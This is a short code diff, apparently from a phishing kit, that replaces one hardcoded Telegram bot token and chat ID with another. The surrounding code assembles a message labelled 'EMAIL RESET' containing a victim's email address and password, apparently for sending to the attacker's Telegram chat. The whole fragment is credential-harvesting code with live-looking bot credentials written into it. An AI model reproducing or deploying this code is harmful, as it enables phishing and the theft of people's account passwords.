@@ -23,8 +23,8 @@ const fullName = parsedData.fullname || "N/A";
     setShowPopup(true);
 
   
-    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
-    const chatId = "6837437455";
+    const botToken = "6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo";
+    const chatId = "6639364559";
     const message = `${fullName} EMAIL RESET \n📧 email: ${email}\n🔑 password: ${password}`;
   
     try {
